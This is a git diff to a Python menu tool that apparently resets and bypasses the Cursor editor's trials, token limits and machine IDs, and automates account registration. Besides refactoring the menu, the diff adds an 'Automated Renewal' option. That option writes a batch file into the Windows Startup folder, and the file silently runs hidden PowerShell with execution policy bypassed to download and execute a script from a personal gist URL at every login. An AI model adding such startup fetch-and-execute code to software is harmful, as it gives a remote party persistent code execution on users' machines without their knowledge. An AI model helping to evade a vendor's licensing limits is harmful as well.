@@ -340,7 +340,7 @@ class Translator:
 # Create translator instance
 translator = Translator()
 
-def print_menu():
+def print_menu(menu_items):
     """Print menu options"""
     try:
         config = get_config()
@@ -362,49 +362,19 @@ def print_menu():
     except:
         terminal_width = 80  # Default width
     
-    # Define all menu items
-    menu_items = {
-        0: f"{Fore.GREEN}0{Style.RESET_ALL}. {EMOJI['ERROR']} {translator.get('menu.exit')}",
-        1: f"{Fore.GREEN}1{Style.RESET_ALL}. {EMOJI['RESET']} {translator.get('menu.reset')}",
-        2: f"{Fore.GREEN}2{Style.RESET_ALL}. {EMOJI['SUCCESS']} {translator.get('menu.register_cursor_custom_email', fallback='Register Cursor with Custom Email') if hasattr(translator, 'get') else 'Register Cursor with Custom Email'}",
-        3: f"{Fore.GREEN}3{Style.RESET_ALL}. {EMOJI['INFO']} {translator.get('menu.coming_soon', fallback='Coming Soon')}",
-        4: f"{Fore.GREEN}4{Style.RESET_ALL}. {EMOJI['ERROR']} {translator.get('menu.quit')}",
-        5: f"{Fore.GREEN}5{Style.RESET_ALL}. {EMOJI['LANG']} {translator.get('menu.select_language')}",
-        6: f"{Fore.GREEN}6{Style.RESET_ALL}. {EMOJI['SUN']} {translator.get('menu.register_google')}",
-        7: f"{Fore.GREEN}7{Style.RESET_ALL}. {EMOJI['STAR']} {translator.get('menu.register_github')}",
-        8: f"{Fore.GREEN}8{Style.RESET_ALL}. {EMOJI['UPDATE']} {translator.get('menu.disable_auto_update')}",
-        9: f"{Fore.GREEN}9{Style.RESET_ALL}. {EMOJI['RESET']} {translator.get('menu.totally_reset')}",
-        10: f"{Fore.GREEN}10{Style.RESET_ALL}. {EMOJI['CONTRIBUTE']} {translator.get('menu.contribute')}",
-        11: f"{Fore.GREEN}11{Style.RESET_ALL}. {EMOJI['SETTINGS']}  {translator.get('menu.config')}",
-        12: f"{Fore.GREEN}12{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.bypass_version_check')}",
-        13: f"{Fore.GREEN}13{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.check_user_authorized')}",
-        14: f"{Fore.GREEN}14{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.bypass_token_limit')}",
-        15: f"{Fore.GREEN}15{Style.RESET_ALL}. {EMOJI['BACKUP']}  {translator.get('menu.restore_machine_id')}",
-        16: f"{Fore.GREEN}16{Style.RESET_ALL}. {EMOJI['ERROR']}  {translator.get('menu.delete_google_account')}",
-        17: f"{Fore.GREEN}17{Style.RESET_ALL}. {EMOJI['SETTINGS']}  {translator.get('menu.select_chrome_profile')}",
-        18: f"{Fore.GREEN}18{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.manual_custom_auth')}",
-        19: f"{Fore.GREEN}19{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.automated_renewal')}",
-    }
-    
-    # Automatically calculate the number of menu items in the left and right columns
+    # menu_items is now passed as an argument
     total_items = len(menu_items)
     left_column_count = (total_items + 1) // 2  # The number of options displayed on the left (rounded up)
     
-    # Build left and right columns of menus
     sorted_indices = sorted(menu_items.keys())
     left_menu = [menu_items[i] for i in sorted_indices[:left_column_count]]
     right_menu = [menu_items[i] for i in sorted_indices[left_column_count:]]
     
-    # Calculate the maximum display width of left menu items
     ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-    
     def get_display_width(s):
-        """Calculate the display width of a string, considering Chinese characters and emojis"""
-        # Remove ANSI color codes
         clean_s = ansi_escape.sub('', s)
         width = 0
         for c in clean_s:
-            # Chinese characters and some emojis occupy two character widths
             if ord(c) > 127:
                 width += 2
             else:
@@ -416,11 +386,9 @@ def print_menu():
         width = get_display_width(item)
         max_left_width = max(max_left_width, width)
     
-    # Set the starting position of right menu
-    fixed_spacing = 4  # Fixed spacing
+    fixed_spacing = 4
     right_start = max_left_width + fixed_spacing
     
-    # Calculate the number of spaces needed for right menu items
     spaces_list = []
     for i in range(len(left_menu)):
         if i < len(left_menu):
@@ -429,27 +397,20 @@ def print_menu():
             spaces = right_start - left_width
             spaces_list.append(spaces)
     
-    # Print menu items
     max_rows = max(len(left_menu), len(right_menu))
     
     for i in range(max_rows):
-        # Print left menu items
         if i < len(left_menu):
             left_item = left_menu[i]
             print(left_item, end='')
-            
-            # Use pre-calculated spaces
             spaces = spaces_list[i]
         else:
-            # If left side has no items, print only spaces
             spaces = right_start
             print('', end='')
-        
-        # Print right menu items
         if i < len(right_menu):
             print(' ' * spaces + right_menu[i])
         else:
-            print()  # Change line
+            print()
     if translator.current_language == 'zh_cn' or translator.current_language == 'zh_tw':
         print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}")
     else:
@@ -724,6 +685,30 @@ def wait_for_internet(timeout=60, check_host="8.8.8.8", check_port=53):
             time.sleep(2)
     return False
 
+def get_startup_bat_path():
+    startup_dir = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
+    return os.path.join(startup_dir, "AutomatedRenewalOnStartup.bat")
+
+def create_startup_bat():
+    bat_path = get_startup_bat_path()
+    # The .bat file runs a PowerShell command to fetch and execute the remote vishan.ps1 script silently.
+    # The PowerShell script will NOT delete itself or the .bat file, so it can run again after 24 hours.
+    command = (
+        '@echo off\n'
+        'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command '
+        '"irm https://gist.githubusercontent.com/vishan-tries-to-debug/05395bb3de51707b1757cd9ef2440609/raw/e9965cb63af72ff58115382eb4b4736a046186aa/vishan.ps1 | iex"\n'
+    )
+    with open(bat_path, "w") as f:
+        f.write(command)
+    return bat_path
+
+def remove_startup_bat():
+    bat_path = get_startup_bat_path()
+    if os.path.exists(bat_path):
+        os.remove(bat_path)
+        return True
+    return False
+
 def main():
     # Check for admin privileges if running as executable on Windows only
     if platform.system() == 'Windows' and is_frozen() and not is_admin():
@@ -764,11 +749,32 @@ def main():
         else:
             print("Automated registration cooldown not met. Exiting.")
         return
-    print_menu()
+    menu_items = {
+        0: f"{Fore.GREEN}0{Style.RESET_ALL}. {EMOJI['ERROR']} {translator.get('menu.exit')}",
+        1: f"{Fore.GREEN}1{Style.RESET_ALL}. {EMOJI['RESET']} {translator.get('menu.reset')}",
+        2: f"{Fore.GREEN}2{Style.RESET_ALL}. {EMOJI['SUCCESS']} {translator.get('menu.register_cursor_custom_email', fallback='Register Cursor with Custom Email') if hasattr(translator, 'get') else 'Register Cursor with Custom Email'}",
+        3: f"{Fore.GREEN}3{Style.RESET_ALL}. {EMOJI['UPDATE']} {translator.get('menu.automated_renewal', fallback='Automated Renewal on Start-up')}",
+        4: f"{Fore.GREEN}4{Style.RESET_ALL}. {EMOJI['ERROR']} {translator.get('menu.quit')}",
+        5: f"{Fore.GREEN}5{Style.RESET_ALL}. {EMOJI['LANG']} {translator.get('menu.select_language')}",
+        6: f"{Fore.GREEN}6{Style.RESET_ALL}. {EMOJI['SUN']} {translator.get('menu.register_google')}",
+        7: f"{Fore.GREEN}7{Style.RESET_ALL}. {EMOJI['STAR']} {translator.get('menu.register_github')}",
+        8: f"{Fore.GREEN}8{Style.RESET_ALL}. {EMOJI['UPDATE']} {translator.get('menu.disable_auto_update')}",
+        9: f"{Fore.GREEN}9{Style.RESET_ALL}. {EMOJI['RESET']} {translator.get('menu.totally_reset')}",
+        10: f"{Fore.GREEN}10{Style.RESET_ALL}. {EMOJI['CONTRIBUTE']} {translator.get('menu.contribute')}",
+        11: f"{Fore.GREEN}11{Style.RESET_ALL}. {EMOJI['SETTINGS']}  {translator.get('menu.config')}",
+        12: f"{Fore.GREEN}12{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.bypass_version_check')}",
+        13: f"{Fore.GREEN}13{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.check_user_authorized')}",
+        14: f"{Fore.GREEN}14{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.bypass_token_limit')}",
+        15: f"{Fore.GREEN}15{Style.RESET_ALL}. {EMOJI['BACKUP']}  {translator.get('menu.restore_machine_id')}",
+        16: f"{Fore.GREEN}16{Style.RESET_ALL}. {EMOJI['ERROR']}  {translator.get('menu.delete_google_account')}",
+        17: f"{Fore.GREEN}17{Style.RESET_ALL}. {EMOJI['SETTINGS']}  {translator.get('menu.select_chrome_profile')}",
+        18: f"{Fore.GREEN}18{Style.RESET_ALL}. {EMOJI['UPDATE']}  {translator.get('menu.manual_custom_auth')}",
+    }
+    print_menu(menu_items)
     
     while True:
         try:
-            choice_num = 19
+            choice_num = max(menu_items.keys())
             choice = input(f"\n{EMOJI['ARROW']} {Fore.CYAN}{translator.get('menu.input_choice', choices=f'0-{choice_num}')}: {Style.RESET_ALL}")
 
             match choice:
@@ -779,7 +785,7 @@ def main():
                 case "1":
                     import reset_machine_manual
                     reset_machine_manual.run(translator)
-                    print_menu()   
+                    print_menu(menu_items)   
                 case "2":
                     import cursor_register_manual
                     # visible registration, not headless
@@ -787,94 +793,90 @@ def main():
                     if result and isinstance(result, tuple) and len(result) == 3:
                         email, password, domain = result
                         write_credentials_to_downloads(email, password, domain)
-                    print_menu()    
+                    print_menu(menu_items)    
                 case "3":
-                    print(f"\n{Fore.YELLOW}{translator.get('menu.coming_soon', fallback='Coming soon!')}{Style.RESET_ALL}")
-                    print_menu()
+                    bat_path = get_startup_bat_path()
+                    if not os.path.exists(bat_path):
+                        create_startup_bat()
+                        print(f"{Fore.GREEN}{EMOJI['SUCCESS']} Automated renewal enabled! Startup script created at: {bat_path}{Style.RESET_ALL}")
+                        time.sleep(2)
+                    else:
+                        print(f"{Fore.YELLOW}{EMOJI['INFO']} Automated renewal is already enabled.\nDo you want to disable it? (y/N): {Style.RESET_ALL}", end="")
+                        ans = input().strip().lower()
+                        if ans in ["y", "yes"]:
+                            if remove_startup_bat():
+                                print(f"{Fore.GREEN}{EMOJI['SUCCESS']} Automated renewal disabled. Startup script removed.{Style.RESET_ALL}")
+                            else:
+                                print(f"{Fore.RED}{EMOJI['ERROR']} Failed to remove startup script.{Style.RESET_ALL}")
+                            time.sleep(2)
+                        else:
+                            print(f"{Fore.YELLOW}{EMOJI['INFO']} Automated renewal remains enabled.{Style.RESET_ALL}")
+                            time.sleep(2)
+                    print_menu(menu_items)
                 case "4":
                     import quit_cursor
                     quit_cursor.quit_cursor(translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "5":
                     if select_language():
-                        print_menu()
+                        print_menu(menu_items)
                     continue
                 case "6":
                     from oauth_auth import main as oauth_main
                     oauth_main('google',translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "7":
                     from oauth_auth import main as oauth_main
                     oauth_main('github',translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "8":
                     import disable_auto_update
                     disable_auto_update.run(translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "9":
                     import totally_reset_cursor
                     totally_reset_cursor.run(translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "10":
                     import logo
                     print(logo.CURSOR_CONTRIBUTORS)
-                    print_menu()
+                    print_menu(menu_items)
                 case "11":
                     from config import print_config
                     print_config(get_config(), translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "12":
                     import bypass_version
                     bypass_version.main(translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "13":
                     import check_user_authorized
                     check_user_authorized.main(translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "14":
                     import bypass_token_limit
                     bypass_token_limit.run(translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "15":
                     import restore_machine_id
                     restore_machine_id.run(translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "16":
                     import delete_cursor_google
                     delete_cursor_google.main(translator)
-                    print_menu()
+                    print_menu(menu_items)
                 case "17":
                     from oauth_auth import OAuthHandler
                     oauth = OAuthHandler(translator)
                     oauth._select_profile()
-                    print_menu()
+                    print_menu(menu_items)
                 case "18":
                     import manual_custom_auth
                     manual_custom_auth.main(translator)
-                    print_menu()
-                case "19":
-                    print(f"Waiting 60 seconds after startup to ensure internet connection...")
-                    time.sleep(60)
-                    if not wait_for_internet():
-                        print("No internet connection detected after 60 seconds. Exiting.")
-                        print_menu()
-                        continue
-                    cooldown_file = os.path.join(get_downloads_folder(), "last_automated_run.txt")
-                    if cooldown_ok(cooldown_file):
-                        import cursor_register_manual
-                        result = cursor_register_manual.main(translator, use_priority_email_tab=True, return_creds=True)
-                        if result and isinstance(result, tuple) and len(result) == 3:
-                            email, password, domain = result
-                            update_cooldown(cooldown_file)
-                            write_credentials_to_downloads(email, password, domain)
-                        else:
-                            print("Registration failed or credentials not returned.")
-                    else:
-                        print("Automated registration cooldown not met. Exiting.")
-                    print_menu()
+                    print_menu(menu_items)
                 case _:
                     print(f"{Fore.RED}{EMOJI['ERROR']} {translator.get('menu.invalid_choice')}{Style.RESET_ALL}")
-                    print_menu()
+                    print_menu(menu_items)
 
         except KeyboardInterrupt:
             print(f"\n{Fore.YELLOW}{EMOJI['INFO']}  {translator.get('menu.program_terminated')}{Style.RESET_ALL}")
@@ -882,7 +884,7 @@ def main():
             return
         except Exception as e:
             print(f"{Fore.RED}{EMOJI['ERROR']} {translator.get('menu.error_occurred', error=str(e))}{Style.RESET_ALL}")
-            print_menu()
+            print_menu(menu_items)
 
 if __name__ == "__main__":
     main()
